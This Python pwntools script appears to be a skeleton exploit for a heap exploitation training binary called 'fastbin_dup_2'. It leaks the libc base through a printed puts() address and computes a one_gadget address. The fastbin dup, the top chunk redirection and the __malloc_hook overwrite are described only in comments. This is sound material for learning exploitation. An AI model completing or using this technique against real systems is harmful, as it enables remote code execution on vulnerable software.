#!/usr/bin/env python


from pwn import *

BINARY = './fastbin_dup_2'
LIBC = './libc.so.6'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)

# Global index variable to keep track of allocated chunks
INDEX = 0
# one_gadget found in this version of glibc using david942j/one_gadget
ONE_GADGET_OFFSET = 0xe1fa1


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        return remote(ADDR, PORT)


def malloc(io, size, data):
    global INDEX

    io.send("1")
    io.sendafter("size: ", str(size))
    io.sendafter("data: ", data)
    io.recvuntil("> ")

    INDEX += 1
    return (INDEX - 1)


def free(io, index):
    io.send("2")
    io.sendafter("index ", str(index))
    io.recvuntil("> ")


def solve():
    io = conn()
    io.timeout = 0.1

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    log.info("puts() found at: " + hex(libc.sym.puts))
    log.info("libc base found at: " + hex(libc.address))
    one_gadget = libc.address + ONE_GADGET_OFFSET
    log.info("one_gadget found at: " + hex(one_gadget))

    # Use fastbin dup to get fake size field metadata in the arena.

    # Use fastbin dup to create fake chunk in arena to modify top chunk
    # pointer. Top chunk will be placed chunk before __malloc_hook.

    # Allocate a chunk and overwrite __malloc_hook.

    io.interactive()


if __name__ == "__main__":
    solve()
